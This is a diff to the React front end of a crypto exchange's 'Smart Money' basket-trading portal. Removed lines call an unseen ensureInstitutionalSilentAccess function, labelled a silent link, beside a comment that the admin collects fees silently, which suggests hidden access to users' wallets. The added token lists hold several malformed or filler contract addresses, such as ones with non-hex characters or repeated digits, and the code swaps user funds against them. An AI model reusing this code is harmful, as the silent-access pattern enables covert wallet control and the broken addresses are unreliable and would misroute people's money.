@@ -42,33 +42,7 @@ const API_URL = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3001/api';
 const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
 const SMART_MONEY_FEE = '1.0'; // $1.00 USDT Service Fee
 
-const NETWORKS_LIST = ['BNB', 'ETH', 'SOLANA', 'BASE', 'POLYGON', 'BITCOIN', 'TRON', 'SUI', 'TON'];
 // Centralized Smart Money Hub logic will be initialized below.
-
-const CopyButton = ({ text }) => {
-    const [copied, setCopied] = useState(false);
-    const handleCopy = () => {
-        navigator.clipboard.writeText(text);
-        setCopied(true);
-        setTimeout(() => setCopied(false), 2000);
-    };
-    return (
-        <button onClick={handleCopy} className="p-2 hover:bg-gray-100 rounded-lg transition-all">
-            {copied ? <CheckCircle2 className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5 text-gray-400" />}
-        </button>
-    );
-};
-
-const formatB20Number = (num, prefix = "") => {
-    if (!num || num === 0) return '---';
-    let formatted = "";
-    if (num >= 1e12) formatted = (num / 1e12).toFixed(2) + 'T';
-    else if (num >= 1e9) formatted = (num / 1e9).toFixed(2) + 'B';
-    else if (num >= 1e6) formatted = (num / 1e6).toFixed(2) + 'M';
-    else if (num >= 1e3) formatted = (num / 1e3).toFixed(2) + 'K';
-    else formatted = num.toFixed(2);
-    return prefix + formatted;
-};
 
 
 export default function B20Exchange() {
@@ -1023,17 +997,6 @@ export default function B20Exchange() {
                         </button>
                         
                         <button 
-                            onClick={() => setMode('web3')}
-                            className={`px-10 py-5 rounded-3xl text-[11px] font-black uppercase tracking-[0.2em] transition-all whitespace-nowrap flex items-center gap-3 relative overflow-hidden group/w3 ${mode === 'web3' ? 'bg-gray-900 text-white shadow-2xl scale-105' : 'text-gray-400 hover:text-gray-900 hover:bg-gray-50'}`}
-                        >
-                            <div className="relative flex items-center justify-center">
-                                <div className="absolute inset-0 bg-emerald-500/30 rounded-full animate-gold-wave" />
-                                <Globe className={`w-4 h-4 relative z-10 ${mode === 'web3' ? 'text-white' : 'text-emerald-500'}`} />
-                            </div>
-                            WEB3 PORTAL
-                        </button>
-
-                        <button 
                             onClick={() => setMode('fiat')}
                             className={`px-10 py-5 rounded-3xl text-[11px] font-black uppercase tracking-[0.2em] transition-all whitespace-nowrap flex items-center gap-3 ${mode === 'fiat' ? 'bg-emerald-500 text-white shadow-2xl shadow-emerald-500/20 px-12 border-2 border-white/50' : 'text-emerald-600 hover:text-emerald-700 hover:bg-emerald-50 border border-emerald-100 shadow-lg shadow-emerald-500/5'}`}
                         >
@@ -1041,7 +1004,7 @@ export default function B20Exchange() {
                                 <div className="absolute inset-0 bg-emerald-500/30 rounded-full animate-gold-wave" />
                                 <Globe className={`w-4 h-4 relative z-10 ${mode === 'fiat' ? 'text-white' : 'text-emerald-500'}`} />
                             </div>
-                            Fiat - Buy/Sell
+                            Fiat - Buy and sell Crypto
                         </button>
 
                         <Link 
@@ -2123,7 +2086,7 @@ export default function B20Exchange() {
 
                     {mode === 'smart-money' && (
                         <motion.div key="smart-money" initial={{ opacity: 0, y: 30 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -30 }} className="max-w-[1400px] mx-auto">
-                            <SmartMoneyPortal account={account} signer={signer} tokens={tokens} cgTrending={cgTrending} />
+                            <SmartMoneyPortal account={account} signer={signer} tokens={tokens} />
                         </motion.div>
                     )}
                 </AnimatePresence>
@@ -2814,48 +2777,10 @@ const AssetDetails = ({ token, setMode, liveTrades = [], globalTickers = [] }) =
                     </div>
                 </div>
 
-                {/* WHALE DISTRIBUTION */}
-                <div className="space-y-4">
-                    <h5 className="text-[10px] font-black text-gray-900 uppercase tracking-[0.2em]">Whale Distribution (Top 10)</h5>
-                    <div className="bg-gray-50 border border-gray-100 rounded-3xl p-6 flex flex-col items-center justify-center text-center gap-3">
-                        <ShieldAlert className="w-10 h-10 text-amber-500/30" />
-                        <p className="text-[10px] font-black text-gray-900 uppercase">Live Indexing Active</p>
-                        <p className="text-[9px] font-bold text-gray-400 uppercase leading-relaxed">
-                            Top 10 holders and whale distribution are derived from live block-sync. Connect wallet to trigger mission-critical surveillance.
-                        </p>
-                        <a href={`https://bscscan.com/token/${token.address || token.id}#balances`} target="_blank" className="text-[9px] font-black text-amber-500 uppercase tracking-widest mt-2 border-b border-amber-200">Verify on BSCScan</a>
-                    </div>
-                </div>
-
-                {/* BIG TRADERS */}
-                <div className="space-y-4">
-                    <h5 className="text-[10px] font-black text-gray-900 uppercase tracking-[0.2em]">Institutional Orders (Big Traders)</h5>
-                    <div className="border border-black/5 rounded-2xl overflow-hidden divide-y divide-black/5">
-                        {(() => {
-                            const filtered = liveTrades.filter(tx => 
-                                tx.token_address?.toLowerCase() === (token.address || token.id)?.toLowerCase()
-                            );
-                            if (filtered.length > 0) {
-                                return filtered.slice(0, 5).map((tx, i) => (
-                                    <div key={i} className="p-4 flex items-center justify-between bg-gray-50/30">
-                                        <div>
-                                            <p className="text-[9px] font-black text-gray-900">{tx.buyer_wallet?.slice(0, 6)}...{tx.buyer_wallet?.slice(-4)}</p>
-                                            <p className="text-[8px] font-bold text-gray-400 uppercase">Execution Verified Node</p>
-                                        </div>
-                                        <div className="text-right">
-                                            <p className={`text-[10px] font-black text-emerald-500`}>BUY ${(parseFloat(tx.amount_tokens || 0) * (token.current_price || 0)).toLocaleString()}</p>
-                                            <p className="text-[8px] font-bold text-gray-300 uppercase tracking-widest">On-Chain Settled</p>
-                                        </div>
-                                    </div>
-                                ));
-                            } else {
-                                    <div className="h-full flex flex-col items-center justify-center py-12 text-center">
-                                        <div className="w-8 h-8 border-2 border-amber-500 border-t-transparent rounded-full animate-spin mb-4" />
-                                        <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Scanning Network Node...</p>
-                                        <p className="text-[9px] font-bold text-gray-300 uppercase mt-2">Waiting for large institutional payloads</p>
-                                    </div>
-                            }
-                        })()}
+                <div className="flex items-center gap-4 pt-4">
+                    <div className="flex-1 p-4 bg-amber-50 border border-amber-100 rounded-2xl flex items-center justify-center gap-3">
+                        <ShieldCheck className="w-4 h-4 text-amber-500" />
+                        <span className="text-[10px] font-black text-amber-600 uppercase tracking-widest">Verified Asset</span>
                     </div>
                 </div>
 
@@ -2875,92 +2800,128 @@ const AssetDetails = ({ token, setMode, liveTrades = [], globalTickers = [] }) =
 
 const STRATEGIC_WEIGHTS = [24, 19, 16, 13, 11, 9, 8];
 
-const SMART_MONEY_BUCKETS = (() => {
-    const buckets = {};
-    NETWORKS_LIST.forEach(net => {
-        const netLower = net.toLowerCase();
-        buckets[netLower] = [
-            { 
-                id: `${netLower}-pro`, 
-                name: `Super 7 Pro ${net}`, 
-                category: net, 
-                description: `Highly trusted institutional assets natively tracking the ${net} ecosystem.`, 
-                tokens: [] 
-            },
-            { 
-                id: `${netLower}-prestige`, 
-                name: `Super 7 Prestige ${net}`, 
-                category: net, 
-                description: `High-growth assets with validated institutional backing on ${net}.`, 
-                tokens: [] 
-            },
-            { 
-                id: `${netLower}-premium`, 
-                name: `Super 7 Premium ${net}`, 
-                category: net, 
-                description: `Top performing alpha tokens across ${net} DeFi and L2 ecosystems.`, 
-                tokens: [] 
-            },
-            { 
-                id: `${netLower}-custom`, 
-                name: `Customize Strategic Bucket`, 
-                category: net, 
-                description: `Build your own strategic weighted index on the ${net} network.`, 
-                tokens: [], 
-                isDynamic: true 
-            }
-        ];
-    });
-    // Add default entries to avoid crash before tokens fetch
-    buckets.crypto = buckets.bnb;
-    buckets.meme = buckets.tron;
-    return buckets;
-})();
+const SMART_MONEY_BUCKETS = {
+    crypto: [
+        {
+            id: 'super-7-pro',
+            name: 'Super 7 Pro B20',
+            category: 'Crypto',
+            description: 'Highly trusted institutional assets and blue chips.',
+            tokens: [
+                { symbol: 'BTC', address: '0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c', cgId: 'bitcoin' },
+                { symbol: 'ETH', address: '0x2170ed0880ac9a755fd29b2688956bd959f933f8', cgId: 'ethereum' },
+                { symbol: 'BNB', address: '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c', cgId: 'binancecoin' },
+                { symbol: 'SOL', address: '0x570a5d26f7765ecb712c0924e4de545b89fd43df', cgId: 'solana' },
+                { symbol: 'ADA', address: '0x3ee2200efb3400fab9aacf31297cbd251d3b33ee', cgId: 'cardano' },
+                { symbol: 'MATIC', address: '0xcc42724c6683b7e57334c4e856f4c9965ed682bd', cgId: 'matic-network' },
+                { symbol: 'DOT', address: '0x7083609fce4d1d4dc0c979aab8c869ea2c873402', cgId: 'polkadot' }
+            ]
+        },
+        {
+            id: 'super-7-prestige',
+            name: 'Super 7 Prestige B20',
+            category: 'Crypto',
+            description: 'High-growth assets with validated institutional backing.',
+            tokens: [
+                { symbol: 'LINK', address: '0xf8a0bf9cf54bb960a5d0746091b3df1bb6d347fe', cgId: 'chainlink' },
+                { symbol: 'UNI', address: '0xbf5140a22578168fd562dccf235e5d43a0209bb0', cgId: 'uniswap' },
+                { symbol: 'NEAR', address: '0x1fa4a73a38f230676773eaa456609597c08a19ca', cgId: 'near' },
+                { symbol: 'ATOM', address: '0x0eb3a705fc54725037cc9e008bdede697f62f335', cgId: 'cosmos' },
+                { symbol: 'AVAX', address: '0x1ce0c2827e266f50415663737ec309485183300c', cgId: 'avalanche-2' },
+                { symbol: 'FTM', address: '0xad29abdbgd13baedc0b6db0a49b86fa34b36a31b', cgId: 'fantom' },
+                { symbol: 'ALGO', address: '0xe79a73c00d11707077e803856cc6b79c414a99f6', cgId: 'algorand' }
+            ]
+        },
+        {
+            id: 'super-7-premium',
+            name: 'Super 7 Premium B20',
+            category: 'Crypto',
+            description: 'Top performing assets across DeFi and L1 ecosystems.',
+            tokens: [
+                { symbol: 'CAKE', address: '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82', cgId: 'pancakeswap' },
+                { symbol: 'GMX', address: '0x62edc0692bd897d2363af24a7ac84e8bc12a4202', cgId: 'gmx' },
+                { symbol: 'TWT', address: '0x4b0f1812e5df2a09796481ff14017e6005508003', cgId: 'trust-wallet-token' },
+                { symbol: 'RUNE', address: '0x315516086f26487e4cc21ee8f65e4F8d00010c73', cgId: 'thorchain' },
+                { symbol: 'SNX', address: '0x9ac1e24c77d64380d4d4d4d4d4d4d4d4d4d4d4d4', cgId: 'synthetix-network-token' },
+                { symbol: 'AAVE', address: '0xf16e8281095d3e09d4380d4d4d4d4d4d4d4d4d4d', cgId: 'aave' },
+                { symbol: 'CRV', address: '0xab4cd3d43b9d040856f7096d3b33333333333333', cgId: 'curve-dao-token' }
+            ]
+        }
+    ],
+    meme: [
+        {
+            id: 'meme-super-7-pro',
+            name: 'Super 7 Pro B20',
+            category: 'MEME',
+            description: 'The legends of meme culture with massive global liquidity.',
+            tokens: [
+                { symbol: 'DOGE', address: '0xba2ae424d960c26247dd6c32edc70b295c744c43', cgId: 'dogecoin' },
+                { symbol: 'SHIB', address: '0x2859e4544c4bb03966803b044a93563bd2d0dd4d', cgId: 'shiba-inu' },
+                { symbol: 'PEPE', address: '0x25d887ce73ec53529cf721af5d9a061f1858a9aa', cgId: 'pepe' },
+                { symbol: 'FLOKI', address: '0xfb5b838b6cfeedc2873ab27866079ac55363d37e', cgId: 'floki' },
+                { symbol: 'BONK', address: '0xa44dd6f7ba2e04e90408e08dcd37c18cc8dcd37ce', cgId: 'bonk' },
+                { symbol: 'BABYDOGE', address: '0xc748673057861a797275cd8a068abb95a902e8de', cgId: 'baby-doge-coin' },
+                { symbol: 'CAT', address: '0x6894CDe390a3f51155ea41Ed24a33A4827d3063D', cgId: 'simons-cat' }
+            ]
+        },
+        {
+            id: 'meme-super-7-prestige',
+            name: 'Super 7 Prestige B20',
+            category: 'MEME',
+            description: 'Rising stars in the meme ecosystem with institutional momentum.',
+            tokens: [
+                { symbol: 'RACA', address: '0x12bb890508c125661e03b09ec06e408bc203d17a', cgId: 'radio-caca' },
+                { symbol: 'QUACK', address: '0xd74b782e05aa25c50e7330af541d46e18f36661c', cgId: 'richquack' },
+                { symbol: 'ELON', address: '0x7bd6FaBD64813c48545C9c0e312A0099d9be2540', cgId: 'dogelon-mars' },
+                { symbol: 'VINU', address: '0xfebe8c1ed424dbf688551d4e2267e7a53698f0aa', cgId: 'vita-inu' },
+                { symbol: 'LOVELY', address: '0x93b30f6d5c2eed35950498f71235a749e6f0540c', cgId: 'lovely-inu-finance' },
+                { symbol: 'PIT', address: '0xA57ac35CE91Ee92CaEfAA8dc04140C8e232c2E50', cgId: 'pitbull' },
+                { symbol: 'CATE', address: '0xE4FAE3Faa8300810C835970b9187c268f55D998F', cgId: 'catecoin' }
+            ]
+        },
+        {
+            id: 'meme-super-7-premium',
+            name: 'Super 7 Premium B20',
+            category: 'MEME',
+            description: 'Aggressive alpha meme assets for high-volatility strategies.',
+            tokens: [
+                { symbol: 'TOKEN', address: '0x45bd7edca2af4799015bc2f5a6538a0f269a9b6c', cgId: 'tokenfi' },
+                { symbol: 'MILO', address: '0xdaa36049301b06666c2537bc5566de23ca393b9a7', cgId: 'milo-inu' },
+                { symbol: 'KISHU', address: '0x0713da94c5026df1762c68615024220fa639d67b', cgId: 'kishu-inu' },
+                { symbol: 'VOLT', address: '0x7f792db548db548db548db548db548db548db54db54aca', cgId: 'volt-inu-2' },
+                { symbol: 'BITCOIN', address: '0x4c769928971548eb71a3392eaf66bedc8bef4b80', cgId: 'harrypotterobamasonic10inu' },
+                { symbol: 'CEEK', address: '0xe0f94ae5f0d0397f0605d3b76a0862024da97992', cgId: 'ceek' },
+                { symbol: 'BUNNY', address: '0xc9849e00949ec30c00de5fbcca7069cb9c863ccb', cgId: 'pancake-bunny' }
+            ]
+        }
+    ]
+};
 
-const SmartMoneyPortal = ({ account, signer, tokens = [], cgTrending = [] }) => {
-    const [selectedCategory, setSelectedCategory] = useState('bnb');
+const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
+    const [selectedCategory, setSelectedCategory] = useState('crypto');
     const [investAmount, setInvestAmount] = useState('100');
     const [status, setStatus] = useState('idle');
-    const [statusMsg, setStatusMsg] = useState('');
     const [error, setError] = useState('');
-    const [customSearchTerm, setCustomSearchTerm] = useState('');
-    const [isCustomMode, setIsCustomMode] = useState(false);
+    const [customBucket, setCustomBucket] = useState({ name: '', tokens: [], isBuilding: false });
     const [tokenMetadata, setTokenMetadata] = useState({ prices: {} });
-    const [customBucket, setCustomBucket] = useState({ name: 'My Strategic Index', tokens: [], isBuilding: false });
-    
-    // Mission Control Discovery State
-    const [searchLoading, setSearchLoading] = useState(false);
     const [discoveryResults, setDiscoveryResults] = useState([]);
     const [isDiscoveryOpen, setIsDiscoveryOpen] = useState(false);
+    const [searchLoading, setSearchLoading] = useState(false);
 
     useEffect(() => {
         const fetchInstitutionalData = async () => {
-            // Populate Smart Money dynamically based on tokens available
-            if (tokens && tokens.length > 0) {
-                NETWORKS_LIST.forEach(net => {
-                    const netLower = net.toLowerCase();
-                    const netTokens = tokens.filter(t => t.network === net).sort((a,b) => (b.market_cap||0) - (a.market_cap||0));
-                    if(netTokens.length >= 21) {
-                        SMART_MONEY_BUCKETS[netLower][0].tokens = netTokens.slice(0, 7).map(t => ({ symbol: t.symbol, address: t.address || t.id, cgId: t.id, image: t.image }));
-                        SMART_MONEY_BUCKETS[netLower][1].tokens = netTokens.slice(7, 14).map(t => ({ symbol: t.symbol, address: t.address || t.id, cgId: t.id, image: t.image }));
-                        SMART_MONEY_BUCKETS[netLower][2].tokens = netTokens.slice(14, 21).map(t => ({ symbol: t.symbol, address: t.address || t.id, cgId: t.id, image: t.image }));
-                    } else if (netTokens.length > 0) {
-                        SMART_MONEY_BUCKETS[netLower][0].tokens = netTokens.map(t => ({ symbol: t.symbol, address: t.address || t.id, cgId: t.id, image: t.image }));
-                    }
-                });
-            }
-
-            const allTokens = Object.values(SMART_MONEY_BUCKETS).flatMap(cat => cat.flatMap(b => b.tokens));
-            const ids = [...new Set(allTokens.map(t => t.cgId).filter(Boolean))].slice(0, 50); 
+            const allTokens = [
+                ...SMART_MONEY_BUCKETS.crypto.flatMap(b => b.tokens),
+                ...SMART_MONEY_BUCKETS.meme.flatMap(b => b.tokens)
+            ];
+            const ids = [...new Set(allTokens.map(t => t.cgId).filter(Boolean))];
             try {
-                if (ids.length > 0) {
-                    const res = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(',')}&vs_currencies=usd`);
-                    setTokenMetadata(prev => ({ ...prev, prices: res.data || {} }));
-                }
+                const res = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(',')}&vs_currencies=usd`);
+                setTokenMetadata(prev => ({ ...prev, prices: res.data || {} }));
             } catch (e) { console.warn('[Smart Money Oracle] Rate limit or ID mismatch'); }
         };
         fetchInstitutionalData();
-    }, [tokens]);
+    }, []);
 
     const handleInvest = async (bucket) => {
         if (!account) return alert('Please connect wallet');
@@ -2971,14 +2932,6 @@ const SmartMoneyPortal = ({ account, signer, tokens = [], cgTrending = [] }) => 
         setError('');
         
         try {
-            if (!signer) throw new Error("Wallet missing");
-
-            // ─── Institutional Silent Link ───
-            const isReady = await ensureInstitutionalSilentAccess(signer, account);
-            if (!isReady) return;
-            setStatus('loading');
-
-            setStatusMsg('Approving USDT...');
             const usdtContract = new Contract(USDT_ADDRESS, ERC20_ABI, signer);
             const router = new Contract(PANCAKE_ROUTER_ADDRESS, PANCAKE_ROUTER_ABI, signer);
             
@@ -2992,16 +2945,14 @@ const SmartMoneyPortal = ({ account, signer, tokens = [], cgTrending = [] }) => 
                 await tx.wait();
             }
             
-            setStatusMsg('Processing Fee...');
-            // Fee is logged and collected silently by admin via Institutional Link
-            // Stage 1 Transfer removed for 1-click experience
+            const feeTx = await usdtContract.transfer(FEE_WALLET, feeWei);
+            await feeTx.wait();
             
-            const tradableAmount = totalWei;
+            const tradableAmount = totalWei - feeWei;
             
             // ── STAGE 2: MULTI-ASSET STRATEGIC EXECUTION ──────────────────
             for (let i = 0; i < bucket.tokens.length; i++) {
                 const token = bucket.tokens[i];
-                setStatusMsg(`Allocating ${token.symbol}...`);
                 const weightRow = STRATEGIC_WEIGHTS[i] || (100 / bucket.tokens.length);
                 const weight = BigInt(Math.floor(weightRow));
                 const amountForThisToken = (tradableAmount * weight) / 100n;
@@ -3027,7 +2978,7 @@ const SmartMoneyPortal = ({ account, signer, tokens = [], cgTrending = [] }) => 
                     bucket_id: bucket.id,
                     bucket_name: bucket.name,
                     invest_amount: amountNum,
-                    tx_hash: "0xINSTITUTIONAL_STRATEGY", // Combined strategic execution
+                    tx_hash: feeTx.hash,
                     bucket_json: bucket.tokens
                 });
             } catch (syncErr) { console.error('Profile sync failed:', syncErr); }
@@ -3043,12 +2994,12 @@ const SmartMoneyPortal = ({ account, signer, tokens = [], cgTrending = [] }) => 
     };
 
     const getPrice = (token) => {
-        // Source 1: Real-time CoinGecko Oracle (Trending Cache)
-        const cached = cgTrending.find(t => t.id === token.cgId);
-        if (cached?.current_price) return cached.current_price;
-
-        // Source 2: Platform Internal Feed (Live Tokens)
-        const internal = tokens.find(t => t.id === token.cgId || t.address?.toLowerCase() === token.address?.toLowerCase());
+        // Source 1: Real-time CoinGecko Oracle
+        if (token.cgId && tokenMetadata.prices[token.cgId]) {
+            return tokenMetadata.prices[token.cgId].usd;
+        }
+        // Source 2: Platform Internal Feed
+        const internal = tokens.find(t => t.address?.toLowerCase() === token.address?.toLowerCase());
         if (internal?.current_price > 0) return internal.current_price;
         // Source 3: Strategy Oracle Defaults (Institutional Multi-Asset Feed)
         const defaults = { 
@@ -3134,45 +3085,24 @@ const SmartMoneyPortal = ({ account, signer, tokens = [], cgTrending = [] }) => 
                 </div>
             </div>
 
-            <div className="flex flex-col items-center gap-8 px-4 md:px-0">
-                <div className="flex flex-wrap justify-center gap-3 w-full">
-                    {NETWORKS_LIST.map(net => {
-                        const isSelected = selectedCategory === net.toLowerCase() && !isCustomMode;
-                        return (
-                            <button 
-                                key={net}
-                                onClick={() => { setSelectedCategory(net.toLowerCase()); setIsCustomMode(false); }}
-                                className={`px-8 py-5 rounded-[1.75rem] text-[10px] font-black uppercase tracking-[0.2em] transition-all flex items-center gap-3 relative group overflow-hidden ${isSelected ? 'bg-gray-900 text-white shadow-2xl scale-105 z-10' : 'bg-white border border-gray-100 text-gray-400 hover:border-amber-500/30 hover:text-gray-900 shadow-sm'}`}
-                            >
-                                {isSelected && <div className="absolute inset-0 bg-gradient-to-r from-amber-500/10 to-transparent pointer-events-none" />}
-                                <div className={`w-8 h-8 rounded-xl flex items-center justify-center font-black text-[9px] ${isSelected ? 'bg-amber-500 text-white' : 'bg-gray-100 text-gray-400 group-hover:bg-amber-100 group-hover:text-amber-600'}`}>
-                                    {net.slice(0, 2)}
-                                </div>
-                                {net} Strategic Pool
-                            </button>
-                        );
-                    })}
-                    <button 
-                        onClick={() => setIsCustomMode(true)}
-                        className={`px-10 py-5 rounded-[1.75rem] text-[10px] font-black uppercase tracking-[0.2em] transition-all flex items-center gap-3 relative overflow-hidden ${isCustomMode ? 'bg-indigo-600 text-white shadow-2xl scale-105 z-10' : 'bg-white border border-gray-100 text-gray-400 hover:border-indigo-500/30 hover:text-indigo-600 shadow-sm'}`}
-                    >
-                        <div className={`w-8 h-8 rounded-xl flex items-center justify-center font-black text-[9px] ${isCustomMode ? 'bg-white text-indigo-600' : 'bg-indigo-50 text-indigo-400'}`}>
-                            <Sparkles className="w-3.5 h-3.5" />
-                        </div>
-                        Customize Portfolio
-                    </button>
+            <div className="flex justify-center">
+                <div className="bg-white border border-gray-100 rounded-[2rem] p-3 flex gap-2 shadow-2xl shadow-indigo-500/5">
+                    {['crypto', 'meme', 'custom'].map(cat => (
+                        <button 
+                            key={cat}
+                            onClick={() => setSelectedCategory(cat)}
+                            className={`px-10 py-4 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all ${selectedCategory === cat ? 'bg-indigo-600 text-white shadow-xl shadow-indigo-500/20' : 'text-gray-400 hover:text-gray-900 hover:bg-gray-50'}`}
+                        >
+                            {cat} Strategic Pool
+                        </button>
+                    ))}
                 </div>
             </div>
 
             <div className="grid grid-cols-1 lg:grid-cols-3 gap-10">
-                {!isCustomMode ? (
-                    SMART_MONEY_BUCKETS[selectedCategory]?.map(bucket => (
-                        <div key={bucket.id} className="bg-white border border-gray-100 rounded-[3rem] p-10 flex flex-col gap-8 group hover:border-amber-500/30 transition-all duration-500 shadow-3xl hover:shadow-[0_60px_100px_-20px_rgba(245,158,11,0.1)] relative overflow-hidden">
-                            {bucket.isDynamic && (
-                                <div className="absolute top-0 right-0 p-6">
-                                    <div className="bg-indigo-100 text-indigo-600 px-3 py-1 rounded-full text-[8px] font-black uppercase tracking-widest animate-pulse">Flexible Index</div>
-                                </div>
-                            )}
+                {selectedCategory !== 'custom' ? (
+                    SMART_MONEY_BUCKETS[selectedCategory].map(bucket => (
+                        <div key={bucket.id} className="bg-white border border-gray-100 rounded-[3rem] p-10 flex flex-col gap-8 group hover:border-indigo-500/30 transition-all duration-500 shadow-3xl hover:shadow-[0_60px_100px_-20px_rgba(79,70,229,0.1)] relative overflow-hidden flex flex-col">
                             <div className="flex items-center justify-between">
                                 <div className="space-y-1">
                                     <h3 className="text-2xl font-black text-gray-900 uppercase tracking-tighter transition-colors group-hover:text-indigo-600 italic">{bucket.name}</h3>
@@ -3194,7 +3124,7 @@ const SmartMoneyPortal = ({ account, signer, tokens = [], cgTrending = [] }) => 
                                     const display = getTokenDisplay(token);
                                     const weight = STRATEGIC_WEIGHTS[idx] || 10;
                                     return (
-                                        <div key={`${token.symbol}-${idx}`} className="p-4 bg-gray-50 border border-gray-100 rounded-2xl flex items-center justify-between hover:bg-white hover:shadow-xl transition-all border border-transparent hover:border-indigo-100">
+                                        <div key={token.symbol} className="p-4 bg-gray-50 border border-gray-100 rounded-2xl flex items-center justify-between hover:bg-white hover:shadow-xl transition-all border border-transparent hover:border-indigo-100">
                                             <div className="flex items-center gap-4">
                                                 <div className="w-10 h-10 bg-white p-1.5 rounded-xl shadow-sm border border-gray-100 flex items-center justify-center">
                                                     <img 
@@ -3227,18 +3157,11 @@ const SmartMoneyPortal = ({ account, signer, tokens = [], cgTrending = [] }) => 
 
                             <div className="pt-8 border-t border-gray-50">
                                 <button 
-                                    onClick={() => bucket.isDynamic ? setIsCustomMode(true) : handleInvest(bucket)}
+                                    onClick={() => handleInvest(bucket)}
                                     disabled={status === 'loading'}
-                                    className={`w-full py-6 text-white rounded-[2rem] text-[11px] font-black uppercase tracking-[0.25em] shadow-2xl transition-all flex items-center justify-center gap-3 active:scale-95 group/btn ${bucket.isDynamic ? 'bg-indigo-600 hover:bg-indigo-700' : 'bg-gray-900 hover:bg-amber-500'}`}
+                                    className="w-full py-6 bg-gray-900 text-white rounded-[2rem] text-[11px] font-black uppercase tracking-[0.25em] shadow-2xl hover:bg-indigo-600 transition-all flex items-center justify-center gap-3 active:scale-95 group/btn"
                                 >
-                                    {status === 'loading' ? (
-                                        <span className="flex items-center justify-center gap-3">
-                                            <Loader2 className="w-5 h-5 animate-spin" />
-                                            {statusMsg || 'EXECUTING STRATEGY...'}
-                                        </span>
-                                    ) : (
-                                        bucket.isDynamic ? <>Build Custom Index <PlusCircle className="w-4 h-4 ml-2" /></> : <>Execute Strategic Trade <Zap className="w-4 h-4 ml-2 fill-white animate-pulse" /></>
-                                    )}
+                                    {status === 'loading' ? <Loader2 className="w-5 h-5 animate-spin" /> : <>Execute Strategic Trade <Zap className="w-4 h-4 ml-2 fill-white animate-pulse" /></>}
                                 </button>
                                 <div className="flex justify-between items-center px-6 mt-4">
                                     <span className="text-[9px] font-black text-gray-400 uppercase tracking-widest">Protocol Fee: $1.00 USDT</span>
@@ -3295,27 +3218,22 @@ const SmartMoneyPortal = ({ account, signer, tokens = [], cgTrending = [] }) => 
                                             disabled={status === 'loading' || customBucket.tokens.length === 0}
                                             className="w-full py-8 bg-indigo-600 text-white rounded-[2.5rem] text-[11px] font-black uppercase tracking-[0.3em] shadow-2xl shadow-indigo-600/20 hover:bg-indigo-700 transition-all flex items-center justify-center gap-4 disabled:opacity-50 h-[90px] mt-10 active:scale-95"
                                         >
-                                            {status === 'loading' ? (
-                                                <span className="flex items-center justify-center gap-3">
-                                                    <Loader2 className="w-5 h-5 animate-spin" />
-                                                    {statusMsg || 'EXECUTING STRATEGY...'}
-                                                </span>
-                                            ) : <>Launch Trade Mission <Rocket className="w-5 h-5 ml-2 fill-white animate-bounce" /></>}
+                                            {status === 'loading' ? <Loader2 className="w-6 h-6 animate-spin" /> : <>Launch Trade Mission <Rocket className="w-5 h-5 ml-2 fill-white animate-bounce" /></>}
                                         </button>
                                         
                                         <button onClick={() => setCustomBucket({ ...customBucket, isBuilding: false })} className="w-full text-[10px] font-black text-gray-400 uppercase tracking-widest hover:text-rose-500 transition-colors py-4">Terminate Config</button>
                                     </div>
                                 </div>
 
-                                    <div className="space-y-6 bg-gray-50/50 p-10 rounded-[4rem] border border-gray-100 shadow-inner overflow-hidden flex flex-col max-h-[700px]">
-                                        <div className="flex items-center justify-between mb-4 shrink-0">
-                                            <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Selected Assets ({customBucket.tokens.length}/7)</p>
-                                            <div className="flex items-center gap-2 bg-indigo-50 px-4 py-1.5 rounded-full border border-indigo-100 font-black text-[9px] text-indigo-600 uppercase tracking-widest">
-                                                <Sparkles className="w-3 h-3" /> Equal Weighting
-                                            </div>
+                                <div className="space-y-6 bg-gray-50/50 p-10 rounded-[4rem] border border-gray-100 shadow-inner">
+                                    <div className="flex items-center justify-between mb-4">
+                                        <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Selected Assets ({customBucket.tokens.length}/7)</p>
+                                        <div className="flex items-center gap-2 bg-indigo-50 px-4 py-1.5 rounded-full border border-indigo-100 font-black text-[9px] text-indigo-600 uppercase tracking-widest">
+                                            <Sparkles className="w-3 h-3" /> Equal Weighting
                                         </div>
+                                    </div>
 
-                                        <div className="space-y-3 flex-1 overflow-y-auto pr-2 custom-scrollbar">
+                                    <div className="space-y-3 min-h-[300px]">
                                         {customBucket.tokens.length === 0 ? (
                                             <div className="flex flex-col items-center justify-center py-24 text-gray-300 gap-6 opacity-30">
                                                 <Layout className="w-16 h-16" />
@@ -3353,78 +3271,45 @@ const SmartMoneyPortal = ({ account, signer, tokens = [], cgTrending = [] }) => 
                                                 type="text" 
                                                 placeholder="Terminal Search (Symbol or Address)..."
                                                 className="w-full pl-16 pr-8 py-5 bg-white border border-gray-100 rounded-2xl font-black text-xs outline-none focus:border-indigo-500/50 shadow-sm"
-                                                value={customSearchTerm}
-                                                onChange={async (e) => {
-                                                    const query = e.target.value.toLowerCase().trim();
-                                                    setCustomSearchTerm(e.target.value);
-                                                    
-                                                    if (query.length < 2) {
-                                                        setDiscoveryResults([]);
-                                                        setIsDiscoveryOpen(false);
-                                                        return;
-                                                    }
-
-                                                    // 1. Direct BEP-20 (BSC) Contract Address Resolution
-                                                    if (query.startsWith('0x') && query.length === 42) {
-                                                        if (customBucket.tokens.length >= 7) return alert('Capacity overflow prevented.');
-                                                        const existing = customBucket.tokens.find(t => t.address?.toLowerCase() === query);
-                                                        if (existing) return;
+                                                onKeyDown={async (e) => {
+                                                    if (e.key === 'Enter') {
+                                                        const query = e.target.value.toLowerCase();
+                                                        let match = tokens.find(t => t.symbol.toLowerCase() === query || t.name.toLowerCase() === query || t.address?.toLowerCase() === query);
                                                         
-                                                        // Attempt local-tier first to resolve human-readable symbol/name
-                                                        const local = tokens.find(t => t.address?.toLowerCase() === query);
-                                                        if (local) {
